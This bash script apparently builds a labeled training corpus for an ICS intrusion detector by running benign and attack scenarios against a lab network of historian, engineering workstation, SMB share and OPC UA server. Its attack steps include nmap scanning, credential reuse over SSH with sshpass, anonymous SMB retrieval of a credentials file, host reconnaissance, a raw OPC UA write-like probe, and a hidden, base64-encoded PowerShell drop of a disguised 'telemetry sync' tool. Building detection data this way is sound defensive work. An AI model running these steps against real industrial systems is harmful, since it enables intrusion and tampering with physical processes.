#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ARTIFACT_ROOT="$ROOT_DIR/artifacts/scenario-runs"
STAMP="$(date -u +%Y%m%dT%H%M%SZ)"

EWS_HOST="${EWS_HOST:-192.168.1.5}"
EWS_USER="${EWS_USER:-john}"
EWS_PASSWORD="${EWS_PASSWORD:-Cisco}"
HISTORIAN_HOST="${HISTORIAN_HOST:-192.168.1.10}"
HISTORIAN_WEB_USER="${HISTORIAN_WEB_USER:-john}"
HISTORIAN_WEB_PASSWORD="${HISTORIAN_WEB_PASSWORD:-Cisco}"
SMB_TARGET="${SMB_TARGET:-192.168.1.7}"
OPCUA_HOST="${OPCUA_HOST:-192.168.1.11}"
OPCUA_PORT="${OPCUA_PORT:-4840}"
REMOTE_TOOL_PATH="${REMOTE_TOOL_PATH:-C:\\Users\\john\\AppData\\Local\\Microsoft\\Diagnosis\\Downloads\\telemetry_sync_cache.py}"

require_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "[ml-corpus] missing command: $1" >&2
    exit 1
  }
}

for cmd in sshpass curl python3 smbclient nmap; do
  require_cmd "$cmd"
done

record_step() {
  local manifest="$1"
  local scenario_id="$2"
  local scenario_family="$3"
  local ground_truth_label="$4"
  local session_intent="$5"
  local session_danger_label="$6"
  local session_summary="$7"
  local step_name="$8"
  local attack_label="$9"
  local attack_stage="${10}"
  local asset_class="${11}"
  local mitre_technique="${12}"
  local source_asset="${13}"
  local target_asset="${14}"
  local event_kind="${15}"
  local start_ts="${16}"
  local end_ts="${17}"
  local exit_code="${18}"
  local command_text="${19}"
  local output_file="${20}"

  python3 - "$manifest" "$scenario_id" "$scenario_family" "$ground_truth_label" "$session_intent" \
    "$session_danger_label" "$session_summary" "$step_name" "$attack_label" "$attack_stage" "$asset_class" \
    "$mitre_technique" "$source_asset" "$target_asset" "$event_kind" "$start_ts" "$end_ts" "$exit_code" \
    "$command_text" "$output_file" <<'PY'
import json
import sys

record = {
    "scenario_id": sys.argv[2],
    "session_id": sys.argv[2],
    "scenario_family": sys.argv[3],
    "ground_truth_label": sys.argv[4],
    "dataset_split": "ml_live_labeled",
    "telemetry_origin": "live_sensor",
    "session_intent": sys.argv[5],
    "session_danger_label": sys.argv[6],
    "session_summary": sys.argv[7],
    "scenario_step": sys.argv[8],
    "attack_label": sys.argv[9],
    "attack_stage": sys.argv[10],
    "asset_class": sys.argv[11],
    "mitre_technique": sys.argv[12],
    "source_asset": sys.argv[13],
    "target_asset": sys.argv[14],
    "event_kind": sys.argv[15],
    "start_ts_epoch": float(sys.argv[16]),
    "end_ts_epoch": float(sys.argv[17]),
    "exit_code": int(sys.argv[18]),
    "command": sys.argv[19],
    "output_file": sys.argv[20],
}
with open(sys.argv[1], "a", encoding="utf-8") as fh:
    fh.write(json.dumps(record, ensure_ascii=True) + "\n")
PY
}

run_step() {
  local scenario_id="$1"
  local scenario_family="$2"
  local ground_truth_label="$3"
  local session_intent="$4"
  local session_danger_label="$5"
  local session_summary="$6"
  local step_name="$7"
  local attack_label="$8"
  local attack_stage="$9"
  local asset_class="${10}"
  local mitre_technique="${11}"
  local source_asset="${12}"
  local target_asset="${13}"
  local event_kind="${14}"
  local command_text="${15}"
  local output_file="${16}"
  local manifest="${17}"

  local start_ts end_ts rc
  start_ts="$(python3 - <<'PY'
import time
print(time.time())
PY
)"
  if bash -lc "$command_text" >"$output_file" 2>&1; then
    rc=0
  else
    rc=$?
  fi
  end_ts="$(python3 - <<'PY'
import time
print(time.time())
PY
)"
  record_step "$manifest" "$scenario_id" "$scenario_family" "$ground_truth_label" "$session_intent" \
    "$session_danger_label" "$session_summary" "$step_name" "$attack_label" "$attack_stage" "$asset_class" \
    "$mitre_technique" "$source_asset" "$target_asset" "$event_kind" "$start_ts" "$end_ts" "$rc" "$command_text" "$output_file"
  echo "[ml-corpus] $scenario_id :: $step_name exit=$rc"
}

ews_ssh_cmd() {
  local remote_cmd="$1"
  printf "sshpass -p %q ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %q@%q %q" \
    "$EWS_PASSWORD" "$EWS_USER" "$EWS_HOST" "$remote_cmd"
}

critical_probe_cmd() {
  cat <<EOF
python3 -c "import socket; payload = b'MSGF' + b'\\x01\\xa1\\x02' + b'line1_vibration_mm_s'; s = socket.create_connection(('${OPCUA_HOST}', ${OPCUA_PORT}), timeout=3); s.sendall(payload); s.close(); print('critical opcua write-like probe sent')"
EOF
}

opcua_healthcheck_cmd() {
  cat <<EOF
python3 -c "import socket; s = socket.create_connection(('${OPCUA_HOST}', ${OPCUA_PORT}), timeout=3); print('opcua tcp healthcheck ok'); s.close()"
EOF
}

build_staged_tool_cmd() {
  python3 - "$ROOT_DIR/demos/payloads/telemetry_sync_cache.py" "$REMOTE_TOOL_PATH" "$OPCUA_HOST" "$OPCUA_PORT" <<'PY'
import base64
import pathlib
import sys

payload = pathlib.Path(sys.argv[1]).read_text(encoding="utf-8")
dest = sys.argv[2]
opcua_host = sys.argv[3]
opcua_port = sys.argv[4]
payload_b64 = base64.b64encode(payload.encode("utf-8")).decode("ascii")
ps = (
    f"$dest='{dest}';"
    "$dir=Split-Path -Parent $dest;"
    "New-Item -ItemType Directory -Force -Path $dir | Out-Null;"
    f"$code=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{payload_b64}'));"
    "[IO.File]::WriteAllText($dest,$code,[Text.Encoding]::UTF8);"
    "attrib +h $dest > $null 2>&1;"
    f"& py -3.11 $dest --endpoint 'opc.tcp://{opcua_host}:{opcua_port}' --cycles 2 --pause 0.2"
)
encoded = base64.b64encode(ps.encode("utf-16le")).decode("ascii")
print(f"powershell -NoProfile -EncodedCommand {encoded}")
PY
}

start_session() {
  local scenario_id="$1"
  OUT_DIR="$ARTIFACT_ROOT/$scenario_id"
  MANIFEST="$OUT_DIR/ground_truth.jsonl"
  mkdir -p "$OUT_DIR"
}

scenario_benign_historian_overview() {
  local scenario_id="$1"
  local tag="$2"
  local family="benign_historian_overview"
  local summary="Authorized operator logged into the historian and reviewed normal process history."
  start_session "$scenario_id"
  local cookie="$OUT_DIR/historian.cookie"

  run_step "$scenario_id" "$family" "benign" "operator_review" "low" "$summary" \
    "historian_login" "authorized_access" "benign_access" "historian" "T0000" "monitoring_laptop" "historian" "http_request" \
    "rm -f '$cookie' && curl -s -o /dev/null -w '%{http_code}\n' -c '$cookie' -b '$cookie' -d 'username=$HISTORIAN_WEB_USER&password=$HISTORIAN_WEB_PASSWORD' -X POST http://$HISTORIAN_HOST:5000/login" \
    "$OUT_DIR/historian_login.txt" "$MANIFEST"

  run_step "$scenario_id" "$family" "benign" "operator_review" "low" "$summary" \
    "historian_overview" "monitoring" "benign_historian_review" "historian" "T0000" "monitoring_laptop" "historian" "http_request" \
    "curl -s -b '$cookie' http://$HISTORIAN_HOST:5000/portal/overview" \
    "$OUT_DIR/historian_overview.txt" "$MANIFEST"

  run_step "$scenario_id" "$family" "benign" "operator_review" "low" "$summary" \
    "historian_history_query" "monitoring" "benign_historian_review" "historian" "T0000" "monitoring_laptop" "historian" "http_request" \
    "curl -s -b '$cookie' 'http://$HISTORIAN_HOST:5000/portal/history?tag=$tag'" \
    "$OUT_DIR/historian_history_query.txt" "$MANIFEST"
}

scenario_benign_api_review() {
  local scenario_id="$1"
  local tag="$2"
  local family="benign_api_review"
  local summary="Authorized monitoring workflow reviewed historian API output without any control-path changes."
  start_session "$scenario_id"

  run_step "$scenario_id" "$family" "benign" "process_monitoring" "low" "$summary" \
    "historian_api_latest" "monitoring" "monitoring_api" "historian" "T0000" "monitoring_laptop" "historian" "http_request" \
    "curl -s http://$HISTORIAN_HOST:5000/api/grafana/latest" \
    "$OUT_DIR/historian_api_latest.txt" "$MANIFEST"

  run_step "$scenario_id" "$family" "benign" "process_monitoring" "low" "$summary" \
    "historian_api_history" "monitoring" "monitoring_api" "historian" "T0000" "monitoring_laptop" "historian" "http_request" \
    "curl -s 'http://$HISTORIAN_HOST:5000/history?tag=$tag'" \
    "$OUT_DIR/historian_api_history.txt" "$MANIFEST"
}

scenario_benign_ews_maintenance() {
  local scenario_id="$1"
  local family="benign_ews_maintenance"
  local summary="Authorized maintenance user accessed EWS, checked service status, and reviewed historian tags."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "benign" "maintenance_check" "low" "$summary" \
    "ews_ssh_access" "authorized_access" "benign_access" "ews" "T0000" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd 'powershell -NoProfile -Command \"Get-Date; Get-Service sshd | Select-Object Status,Name\"')"
  run_step "$scenario_id" "$family" "benign" "maintenance_check" "low" "$summary" \
    "ews_service_status" "maintenance" "benign_host_check" "ews" "T0000" "ews" "ews" "process_launch" \
    "$cmd" "$OUT_DIR/ews_service_status.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd 'cmd /c curl.exe -s http://192.168.1.10:5000/tags')"
  run_step "$scenario_id" "$family" "benign" "maintenance_check" "low" "$summary" \
    "ews_historian_tag_review" "monitoring" "benign_historian_review" "historian" "T0000" "ews" "historian" "http_request" \
    "$cmd" "$OUT_DIR/ews_historian_tag_review.txt" "$MANIFEST"
}

scenario_benign_ews_file_review() {
  local scenario_id="$1"
  local family="benign_ews_file_review"
  local summary="Authorized EWS user reviewed a maintenance document from the SMB share."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "benign" "maintenance_check" "low" "$summary" \
    "ews_ssh_access" "authorized_access" "benign_access" "ews" "T0000" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd 'powershell -NoProfile -Command \"Get-Content '\\''\\\\192.168.1.7\\Operations\\ews_maintenance_access.txt'\\''\"')"
  run_step "$scenario_id" "$family" "benign" "maintenance_check" "low" "$summary" \
    "ews_smb_document_review" "maintenance" "benign_smb_review" "smb" "T0000" "ews" "smb" "smb_read" \
    "$cmd" "$OUT_DIR/ews_smb_document_review.txt" "$MANIFEST"
}

scenario_benign_opcua_healthcheck() {
  local scenario_id="$1"
  local family="benign_opcua_healthcheck"
  local summary="Routine OT healthcheck validated TCP reachability and latest historian telemetry."
  start_session "$scenario_id"

  run_step "$scenario_id" "$family" "benign" "ot_healthcheck" "low" "$summary" \
    "opcua_tcp_healthcheck" "monitoring" "network_healthcheck" "opcua" "T0000" "monitoring_laptop" "opcua" "tcp_probe" \
    "$(opcua_healthcheck_cmd)" "$OUT_DIR/opcua_tcp_healthcheck.txt" "$MANIFEST"

  run_step "$scenario_id" "$family" "benign" "ot_healthcheck" "low" "$summary" \
    "historian_api_latest" "monitoring" "monitoring_api" "historian" "T0000" "monitoring_laptop" "historian" "http_request" \
    "curl -s http://$HISTORIAN_HOST:5000/api/grafana/latest" \
    "$OUT_DIR/historian_api_latest.txt" "$MANIFEST"
}

scenario_discovery_scan() {
  local scenario_id="$1"
  local family="discovery_scan"
  local summary="Rapid service discovery across EWS, SMB, historian, and OPC UA infrastructure."
  start_session "$scenario_id"

  run_step "$scenario_id" "$family" "attack" "discovery_scan" "medium" "$summary" \
    "level3_service_scan" "discovery" "discovery" "network" "T0846" "monitoring_laptop" "level3_network" "network_scan" \
    "nmap -Pn -T4 -p 22,445,5000,4840 192.168.1.5 192.168.1.7 192.168.1.10 192.168.1.11" \
    "$OUT_DIR/level3_service_scan.txt" "$MANIFEST"
}

scenario_historian_failed_login() {
  local scenario_id="$1"
  local family="historian_failed_login"
  local summary="Credential validation attempt against the historian with invalid credentials."
  start_session "$scenario_id"

  run_step "$scenario_id" "$family" "attack" "credential_access" "medium" "$summary" \
    "historian_failed_login_a" "credential_access" "credential_access" "historian" "T0812" "monitoring_laptop" "historian" "http_request" \
    "curl -s -o /dev/null -w '%{http_code}\n' -d 'username=john&password=WrongPass1!' -X POST http://$HISTORIAN_HOST:5000/login" \
    "$OUT_DIR/historian_failed_login_a.txt" "$MANIFEST"

  run_step "$scenario_id" "$family" "attack" "credential_access" "medium" "$summary" \
    "historian_failed_login_b" "credential_access" "credential_access" "historian" "T0812" "monitoring_laptop" "historian" "http_request" \
    "curl -s -o /dev/null -w '%{http_code}\n' -d 'username=operator&password=Cisco' -X POST http://$HISTORIAN_HOST:5000/login" \
    "$OUT_DIR/historian_failed_login_b.txt" "$MANIFEST"
}

scenario_ews_failed_login() {
  local scenario_id="$1"
  local family="ews_failed_login"
  local summary="An invalid password was tried against EWS SSH before the session stopped."
  start_session "$scenario_id"

  run_step "$scenario_id" "$family" "attack" "credential_access" "medium" "$summary" \
    "ews_failed_login" "credential_access" "credential_access" "ews" "T0812" "monitoring_laptop" "ews" "ssh_session" \
    "sshpass -p 'WrongPass1!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $EWS_USER@$EWS_HOST \"hostname && whoami\"" \
    "$OUT_DIR/ews_failed_login.txt" "$MANIFEST"
}

scenario_ews_access_validation() {
  local scenario_id="$1"
  local family="ews_access_validation"
  local summary="Recovered credentials were used to validate EWS SSH access without follow-on collection."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "credential_reuse" "medium" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"
}

scenario_historian_access_validation() {
  local scenario_id="$1"
  local family="historian_access_validation"
  local summary="Valid reused credentials were tested against the historian login portal without further collection."
  start_session "$scenario_id"

  run_step "$scenario_id" "$family" "attack" "credential_access" "medium" "$summary" \
    "historian_login" "credential_access" "credential_access" "historian" "T0812" "monitoring_laptop" "historian" "http_request" \
    "curl -s -o /dev/null -w '%{http_code}\n' -d 'username=$HISTORIAN_WEB_USER&password=$HISTORIAN_WEB_PASSWORD' -X POST http://$HISTORIAN_HOST:5000/login" \
    "$OUT_DIR/historian_login.txt" "$MANIFEST"
}

scenario_anonymous_smb_browse() {
  local scenario_id="$1"
  local family="anonymous_smb_browse"
  local summary="Anonymous browsing of the SMB share exposed maintenance data but the session ended before host access."
  start_session "$scenario_id"

  run_step "$scenario_id" "$family" "attack" "credential_access" "medium" "$summary" \
    "anonymous_smb_browse" "credential_access" "smb_access" "smb" "T0811" "monitoring_laptop" "smb" "smb_read" \
    "smbclient //$SMB_TARGET/Operations -N -m SMB3 -c 'ls; get ews_maintenance_access.txt $OUT_DIR/ews_maintenance_access.txt'" \
    "$OUT_DIR/anonymous_smb_browse.txt" "$MANIFEST"
}

scenario_credential_reuse_chain() {
  local scenario_id="$1"
  local family="credential_reuse_chain"
  local summary="Anonymous SMB access exposed EWS credentials that were then reused for remote access."
  start_session "$scenario_id"
  local cmd

  run_step "$scenario_id" "$family" "attack" "credential_reuse" "medium" "$summary" \
    "anonymous_smb_browse" "credential_access" "smb_access" "smb" "T0811" "monitoring_laptop" "smb" "smb_read" \
    "smbclient //$SMB_TARGET/Operations -N -m SMB3 -c 'ls; get ews_maintenance_access.txt $OUT_DIR/ews_maintenance_access.txt'" \
    "$OUT_DIR/anonymous_smb_browse.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "credential_reuse" "medium" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"
}

scenario_host_recon_light() {
  local scenario_id="$1"
  local family="host_recon_light"
  local summary="Compromised EWS access ran lightweight identification commands but did not pivot into OT paths."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "host_recon" "medium" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd 'powershell -NoProfile -Command \"whoami; hostname; Get-Date\"')"
  run_step "$scenario_id" "$family" "attack" "host_recon" "medium" "$summary" \
    "ews_light_recon" "recon" "host_command" "ews" "T0842" "ews" "ews" "process_launch" \
    "$cmd" "$OUT_DIR/ews_light_recon.txt" "$MANIFEST"
}

scenario_host_recon() {
  local scenario_id="$1"
  local family="host_recon"
  local summary="Compromised EWS session executed discovery-oriented host commands."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "host_recon" "high" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd 'powershell -NoProfile -Command \"whoami; hostname; Get-NetIPAddress | Select-Object -First 4 IPAddress,InterfaceAlias; Get-SmbMapping; Get-Process | Select-Object -First 3 Name,Id\"')"
  run_step "$scenario_id" "$family" "attack" "host_recon" "high" "$summary" \
    "ews_recon_commands" "recon" "host_command" "ews" "T0842" "ews" "ews" "process_launch" \
    "$cmd" "$OUT_DIR/ews_recon_commands.txt" "$MANIFEST"
}

scenario_historian_collection() {
  local scenario_id="$1"
  local tag="$2"
  local family="historian_collection"
  local summary="Remote EWS access was used to query historian tags and review recent process history."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "collection" "high" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd "cmd /c del /q %TEMP%\\\\hist.cookie >nul 2>&1 & curl.exe -s -c %TEMP%\\\\hist.cookie -b %TEMP%\\\\hist.cookie -d \\\"username=$HISTORIAN_WEB_USER&password=$HISTORIAN_WEB_PASSWORD\\\" -X POST http://$HISTORIAN_HOST:5000/login -o NUL -w login=%{http_code} & curl.exe -s -b %TEMP%\\\\hist.cookie http://$HISTORIAN_HOST:5000/portal/history?tag=$tag")"
  run_step "$scenario_id" "$family" "attack" "collection" "high" "$summary" \
    "ews_historian_history_query" "collection" "historian_web" "historian" "T0802" "ews" "historian" "http_request" \
    "$cmd" "$OUT_DIR/ews_historian_history_query.txt" "$MANIFEST"
}

scenario_smb_collection() {
  local scenario_id="$1"
  local family="smb_collection"
  local summary="Compromised EWS session accessed the SMB share to retrieve maintenance data."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "collection" "high" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd 'powershell -NoProfile -Command \"Get-Content '\\''\\\\192.168.1.7\\Operations\\ews_maintenance_access.txt'\\''\"')"
  run_step "$scenario_id" "$family" "attack" "collection" "high" "$summary" \
    "ews_smb_read" "collection" "smb_access" "smb" "T0811" "ews" "smb" "smb_read" \
    "$cmd" "$OUT_DIR/ews_smb_read.txt" "$MANIFEST"
}

scenario_opcua_recon() {
  local scenario_id="$1"
  local family="opcua_recon"
  local summary="Compromised EWS session verified OT TCP reachability toward the OPC UA server."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "ot_recon" "high" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  run_step "$scenario_id" "$family" "attack" "ot_recon" "high" "$summary" \
    "opcua_tcp_probe" "recon" "opcua_path" "opcua" "T0861" "monitoring_laptop" "opcua" "tcp_probe" \
    "$(opcua_healthcheck_cmd)" "$OUT_DIR/opcua_tcp_probe.txt" "$MANIFEST"
}

scenario_full_chain_collection() {
  local scenario_id="$1"
  local tag="$2"
  local family="full_chain_collection"
  local summary="A chained session moved from SMB credential discovery to EWS access, historian review, and OT probing."
  start_session "$scenario_id"
  local cmd

  run_step "$scenario_id" "$family" "attack" "multi_stage_collection" "high" "$summary" \
    "anonymous_smb_browse" "credential_access" "smb_access" "smb" "T0811" "monitoring_laptop" "smb" "smb_read" \
    "smbclient //$SMB_TARGET/Operations -N -m SMB3 -c 'ls; get ews_maintenance_access.txt $OUT_DIR/ews_maintenance_access.txt'" \
    "$OUT_DIR/anonymous_smb_browse.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "multi_stage_collection" "high" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd "cmd /c curl.exe -s http://$HISTORIAN_HOST:5000/portal/history?tag=$tag")"
  run_step "$scenario_id" "$family" "attack" "multi_stage_collection" "high" "$summary" \
    "ews_historian_history_query" "collection" "historian_web" "historian" "T0802" "ews" "historian" "http_request" \
    "$cmd" "$OUT_DIR/ews_historian_history_query.txt" "$MANIFEST"

  run_step "$scenario_id" "$family" "attack" "multi_stage_collection" "high" "$summary" \
    "opcua_tcp_probe" "recon" "opcua_path" "opcua" "T0861" "monitoring_laptop" "opcua" "tcp_probe" \
    "$(opcua_healthcheck_cmd)" "$OUT_DIR/opcua_tcp_probe.txt" "$MANIFEST"
}

scenario_critical_ot_probe() {
  local scenario_id="$1"
  local tag="$2"
  local family="critical_ot_probe"
  local summary="Historian review was followed by a critical OPC UA write-like payload against a sensitive tag."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "ot_impact" "critical" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd "cmd /c curl.exe -s http://$HISTORIAN_HOST:5000/portal/history?tag=$tag")"
  run_step "$scenario_id" "$family" "attack" "ot_impact" "critical" "$summary" \
    "ews_historian_history_query" "collection" "historian_web" "historian" "T0802" "ews" "historian" "http_request" \
    "$cmd" "$OUT_DIR/ews_historian_history_query.txt" "$MANIFEST"

  run_step "$scenario_id" "$family" "attack" "ot_impact" "critical" "$summary" \
    "opcua_critical_probe" "impact" "opcua_write" "opcua" "T0830" "monitoring_laptop" "opcua" "payload_send" \
    "$(critical_probe_cmd)" "$OUT_DIR/opcua_critical_probe.txt" "$MANIFEST"
}

scenario_staged_tool_impact() {
  local scenario_id="$1"
  local family="staged_tool_impact"
  local summary="A staged telemetry manipulation tool was written and executed from EWS before OT payload activity."
  start_session "$scenario_id"
  local cmd

  cmd="$(ews_ssh_cmd 'hostname && whoami')"
  run_step "$scenario_id" "$family" "attack" "ot_impact" "critical" "$summary" \
    "ews_ssh_access" "lateral_movement" "host_activity" "ews" "T0866" "monitoring_laptop" "ews" "ssh_session" \
    "$cmd" "$OUT_DIR/ews_ssh_access.txt" "$MANIFEST"

  cmd="$(ews_ssh_cmd "$(build_staged_tool_cmd)")"
  run_step "$scenario_id" "$family" "attack" "ot_impact" "critical" "$summary" \
    "ews_staged_tool_execution" "impact" "process_anomaly" "ews" "T0831" "ews" "opcua" "process_launch" \
    "$cmd" "$OUT_DIR/ews_staged_tool_execution.txt" "$MANIFEST"

  run_step "$scenario_id" "$family" "attack" "ot_impact" "critical" "$summary" \
    "opcua_critical_probe" "impact" "opcua_write" "opcua" "T0830" "monitoring_laptop" "opcua" "payload_send" \
    "$(critical_probe_cmd)" "$OUT_DIR/opcua_critical_probe.txt" "$MANIFEST"
}

echo "[ml-corpus] generating labeled session corpus under $ARTIFACT_ROOT"
scenario_benign_historian_overview "ml-benign-overview-a-$STAMP" "air_pressure_bar"
scenario_benign_historian_overview "ml-benign-overview-b-$STAMP" "cooling_water_temp_c"
scenario_benign_api_review "ml-benign-api-a-$STAMP" "line1_vibration_mm_s"
scenario_benign_api_review "ml-benign-api-b-$STAMP" "weld_cell_temperature_c"
scenario_benign_ews_maintenance "ml-benign-ews-maint-a-$STAMP"
scenario_benign_ews_file_review "ml-benign-ews-file-a-$STAMP"
scenario_benign_opcua_healthcheck "ml-benign-opcua-a-$STAMP"

scenario_discovery_scan "ml-attack-discovery-a-$STAMP"
scenario_historian_failed_login "ml-attack-hist-failed-a-$STAMP"
scenario_ews_failed_login "ml-attack-ews-failed-a-$STAMP"
scenario_ews_access_validation "ml-attack-ews-login-only-a-$STAMP"
scenario_historian_access_validation "ml-attack-hist-login-only-a-$STAMP"
scenario_anonymous_smb_browse "ml-attack-smb-browse-only-a-$STAMP"
scenario_credential_reuse_chain "ml-attack-creds-a-$STAMP"
scenario_host_recon_light "ml-attack-host-recon-b-$STAMP"
scenario_host_recon "ml-attack-host-recon-a-$STAMP"
scenario_historian_collection "ml-attack-hist-collect-a-$STAMP" "line1_vibration_mm_s"
scenario_historian_collection "ml-attack-hist-collect-b-$STAMP" "air_pressure_bar"
scenario_smb_collection "ml-attack-smb-collect-a-$STAMP"
scenario_opcua_recon "ml-attack-opcua-recon-a-$STAMP"
scenario_full_chain_collection "ml-attack-full-chain-a-$STAMP" "weld_cell_temperature_c"
scenario_full_chain_collection "ml-attack-full-chain-b-$STAMP" "air_pressure_bar"
scenario_critical_ot_probe "ml-attack-ot-impact-a-$STAMP" "line1_vibration_mm_s"
scenario_staged_tool_impact "ml-attack-staged-tool-a-$STAMP"

echo "[ml-corpus] completed corpus generation for stamp $STAMP"
